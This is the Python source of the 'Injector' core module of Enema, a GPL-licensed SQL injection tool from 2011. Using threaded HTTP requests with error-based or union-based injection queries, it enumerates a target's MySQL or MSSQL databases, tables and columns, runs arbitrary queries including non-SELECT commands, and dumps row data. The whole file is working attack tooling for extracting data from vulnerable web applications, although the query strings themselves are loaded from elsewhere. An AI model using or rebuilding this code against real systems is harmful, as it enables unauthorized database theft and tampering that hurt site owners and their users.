"""
    Enema module (core): Injector
    Copyright (C) 2011 Kaeso
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import sys
import time
import core.txtproc
from core.http import HTTP_Handler
from PyQt4 import QtCore
import threading
from queue import Queue


class Injector(QtCore.QThread):
    
    #---------------Signals---------------#
    logSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool)
    dumpProgressSignal = QtCore.pyqtSignal(int, bool)
    msgSignal = QtCore.pyqtSignal(str)
    dbSignal = QtCore.pyqtSignal(str)
    columnSignal = QtCore.pyqtSignal(str, int)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    querySignal = QtCore.pyqtSignal(str)
    tblCountSignal = QtCore.pyqtSignal(int)
    tblSignal = QtCore.pyqtSignal(str)
    #----------------------------------------#
    
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.wq = HTTP_Handler()
        self.vars = vars
        self.qstrings = qstrings
        self.killed = False
        self.wq.logSignal.connect(self.logger)
        
    def run(self):
        self.logSignal.emit("\n+++ TASK STARTED +++")
        
        #Tables task
        if self.vars['task'] == "tables":
            self.getTables()
        #Count in table task
        elif self.vars['task'] == "count":
            self.getCountInTable()
        #Databases task    
        elif self.vars['task'] == "bases" :
            self.getBases()
        #Columns task 
        elif self.vars['task'] == "columns":
            self.getColumns()
        #Query task    
        elif self.vars['task'] == "query":
            self.runQuery()
        #Dump task
        elif self.vars['task'] == "dump":
            self.syncThreads()
            self.dumpProgressSignal.emit(0, True)
            
        self.progressSignal.emit(0, True)
         
        self.logSignal.emit("\n--- TASK STOPPED ---")
        
    def kill(self):
        if self.isRunning():
            self.logSignal.emit("\n\n!!! KILL SIGNAL RECIEVED !!!")
        self.killed = True
        
    def setVars(self, vars, qstrings):
        self.vars = vars
        self.qstrings = qstrings
        
    #Log
    def logger(self, strValue, notFunction=True):
        if notFunction:
            self.logSignal.emit(strValue)
            return
        self.logSignal.emit("\n - [x] 'no_content' returned by function " + strValue)
        
    #Current db type selected
    def dbType(self, todo):
        if self.vars['db_type'] == "mysql":
            if self.vars['inj_type'] == "error-based":
                qstring = self.qstrings['mysql_error_based'][todo]
            else:
                qstring = self.qstrings['mysql_union_based'][todo]
        else:
            if self.vars['inj_type'] == "error-based":
                qstring = self.qstrings['mssql_error_based'][todo]
            else:
                qstring = self.qstrings['mssql_union_based'][todo]
        return core.txtproc.correctQstr(qstring)
        
    #Get current database
    def getCurrDb(self):
        if self.vars['dbListCount'] < 1:
            query = self.wq.buildQuery(self.dbType('curr_db_name'), self.vars)
            db_name = self.wq.httpRequest(query, False, self.vars)
            if db_name == "no_content": 
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return 'no_db'
            self.dbSignal.emit(db_name)
        else:
            db_name = self.vars['dbName']
        return db_name
        
    #Getting bases
    def getBases(self):
        #If not in (array) method selected
        if self.vars['notInArray']:
            current_db = self.vars['dbName']
            while not self.killed:
                query = self.wq.buildQuery(self.dbType('get_db_name'), self.vars, {'cdb' : current_db})
                db_name = self.wq.httpRequest(query, False, self.vars)
                if db_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                    return
                elif db_name == "isnull":
                    break
                current_db += ",'" + db_name + "'"
                self.dbSignal.emit(db_name)
        #not in (substring) method
        else:
            query = self.wq.buildQuery(self.dbType('dbs_count'), self.vars)
            dbCount = self.wq.httpRequest(query, False, self.vars)
            if dbCount == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> dbCount", False)
            tQueue = Queue()
            threads = []
            for tNum in range(int(dbCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtBases, args=(tNum, tQueue, dbCount)) 
                threads.append(t)
                t.start()
                time.sleep(0.1)
            for thread in threads:
                thread.join()
                    
    #Multithread tables
    def mtBases(self, tNum, tQueue, dbCount):
        while not self.killed:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('get_db_name2'), self.vars, {'num' : str(tNum)})
            db_name = self.wq.httpRequest(query, False, self.vars)
            if db_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return
            self.dbSignal.emit(db_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(dbCount) - 1, False)

    #Getting tables
    def getTables(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        query = self.wq.buildQuery(self.dbType('tbls_count'), self.vars,\
                                   {'cdb' : current_db})
        tblCount = self.wq.httpRequest(query, False, self.vars)
        if tblCount == "no_content": 
            self.logger(sys._getframe().f_code.co_name + "() -> tblCount", False)
            return
        try:
            self.tblCountSignal.emit(int(tblCount))
        except ValueError as err:
            self.logger("\nSomething wrong. Check server request and response...\n\n[details]: " + str(err), True)
            return
        if self.vars['notInArray']:
            current_table = ""
            while not self.killed:
                query = self.wq.buildQuery(self.dbType('get_tbl_name'), self.vars,\
                                        {'cdb' : current_db, 'ctbl' : current_table})
                table_name = self.wq.httpRequest(query, False, self.vars)
                if table_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                    return
                elif table_name == "isnull":
                    break
                current_table += ",'" + table_name + "'"
                self.tblSignal.emit(table_name)
                self.progressSignal.emit(int(tblCount), False)
        else:
            tQueue = Queue()
            threads = []
            for tNum in range(int(tblCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtTables, args=(tNum, tQueue, tblCount, current_db)) 
                threads.append(t)
                t.start()
                time.sleep(0.1)
            for thread in threads:
                thread.join()
                
    #Multithread tables
    def mtTables(self, tNum, tQueue, tblCount, current_db):
        while not self.killed:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('get_tbl_name2'), self.vars,\
                                        {'cdb' : current_db, 'num' : str(tNum)})
            table_name = self.wq.httpRequest(query, False, self.vars)
            if table_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                return
            self.tblSignal.emit(table_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(tblCount) - 1, False)
        
    #Getitng columns
    def getColumns(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        tables = self.vars['tables']
        #If not in(array) method selected:
        if self.vars['notInArray']: 
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                current_column = ""
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable", False)
                    return
                while not self.killed:
                    #self.vars['ccol'] = current_column
                    query = self.wq.buildQuery(self.dbType('get_column_name'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'ccol': current_column})
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> column_name", False)
                        return
                    elif column_name == "isnull":
                        break
                    current_column += ",'" + column_name + "'"
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
        #If not in (substring - MSSQL) or LIMIT(MySQL) method selected
        else:
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> columnsinTable", False)
                    return
                for rowid in range(int(columnsInTable)):
                    if self.killed:
                        return
                    #If not in(substring) method selected:
                    if self.vars['notInSubstring']:
                        query = self.wq.buildQuery(self.dbType('get_column_name2'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    #If ordinal_position method selected:
                    elif self.vars['ordinal_position']:
                        rowid += 1
                        query = self.wq.buildQuery(self.dbType('get_column_name3'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name", False)
                        return
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
            
    #Show rows count in selected table
    def getCountInTable(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        self.vars['cdb'] = current_db
        query = self.wq.buildQuery(self.dbType('rows_count'), self.vars, {'cdb' : current_db})
        rowsInTable = self.wq.httpRequest(query, False, self.vars)
        if rowsInTable == "no_content":
            self.logger(sys._getframe().f_code.co_name + "() -> rowsInTable", False)
            return
        msg = (rowsInTable + " rows in " + self.vars['selected_table'])
        self.msgSignal.emit(msg)
        
    #Run Query     
    def runQuery(self):
        #If this select command
        if self.vars['querySelect']:
            query = self.wq.buildQuery(self.dbType('query'), self.vars)
            result = self.wq.httpRequest(query, False, self.vars)
        else:
            result = "NULL"
            self.wq.httpRequest(self.vars['query_cmd'], True, self.vars)
        self.querySignal.emit(result)

    #Making synchronized threads for dumper
    def syncThreads(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        columns = self.vars['columns']
        tQueue = Queue()
        threads = []
        for num in range (len(columns)):
            for tNum in range(self.vars['fromPos'] + 1, self.vars['toPos'] + 1):
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.doDump, args=(tNum, tQueue, current_db, str(columns[num]), num))
                threads.append(t)
                t.start()
                time.sleep(0.1)
            for thread in threads:
                thread.join()
                
    #Data dumping           
    def doDump(self, tNum, tQueue, current_db, column, num):
        while not self.killed:
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('data_dump'), self.vars, {'cdb' : current_db, 'column' : column, 'num' : str(tNum)})
            rowData = self.wq.httpRequest(query, False, self.vars)
            if rowData == "no_content":
                rowData = "NULL"
            self.rowDataSignal.emit(tNum, num, rowData)
            time.sleep(0.1)
            tQueue.task_done()
